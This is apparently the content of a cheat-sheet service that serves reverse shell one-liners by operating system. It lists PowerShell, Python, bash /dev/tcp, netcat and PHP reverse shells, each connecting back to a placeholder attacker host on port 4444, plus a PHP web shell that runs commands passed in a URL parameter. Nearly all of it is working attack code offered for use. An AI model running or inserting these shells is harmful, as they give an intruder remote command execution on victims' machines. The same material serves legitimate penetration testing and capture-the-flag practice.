W
---
Windows Shells:

[1: Powershell] $LHOST = "<LHOST>"; $LPORT = 4444; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()

[2: Powershell] powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

[3: Python] (FILE LISTED BELOW)
import os,socket,subprocess,threading;
def s2p(s, p):
    while True:
        data = s.recv(1024)
        if len(data) > 0:
            p.stdin.write(data)
            p.stdin.flush()

def p2s(s, p):
    while True:
        s.send(p.stdout.read(1))

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("<LHOST>",4444))

p=subprocess.Popen(["bash"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

s2p_thread = threading.Thread(target=s2p, args=[s, p])
s2p_thread.daemon = True
s2p_thread.start()

p2s_thread = threading.Thread(target=p2s, args=[s, p])
p2s_thread.daemon = True
p2s_thread.start()

try:
    p.wait()
except KeyboardInterrupt:
    s.close()


Note: Windows Shells tend to be a lot longer because microsoft hates hackers ;-;
---
L
---
Linux Shells:

[1] bash -i >& /dev/tcp/<LHOST>/4444 0>&1

[2] nc -c bash <LHOST> 4444

[3] nc <LHOST> 4444 -e bash

---
M
---
Mac Shells:

[1] bash -i >& /dev/tcp/<LHOST>/4444 0>&1

[2] nc -c bash <LHOST> 4444

[3] nc <LHOST> 4444 -e bash

Note: All Linux and mac shells are the same
---
Py
---
Python Shells:

[1: Linux] python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("<LHOST>",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'

[2: Windows] Last listing in the windows shells, I didn't want to clutter up this section

[3: Linux] python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
---
PHP
---
PHP Shells:

[1] <?php shell_exec("bash -c 'bash -i >& /dev/tcp/<LHOST>/4444 0>&1'"); ?>

[2: No Listener Required] <?php system($_GET['cmd']); ?>

---
H
---
cURL Shells Usage:

  General Command Structure:
    curl curl-shells.com -A "<option>" [-H "IP: <IP>"]
  
  Note: replace <option> with the operating system you want to find a shell for and replace <IP> with your ip
  

  Options:
    (W)indows
    (L)inux
    (M)ac
    (Py)thon, i.e. -A "Py"
    (PHP), i.e. -A "PHP"
    (H)elp
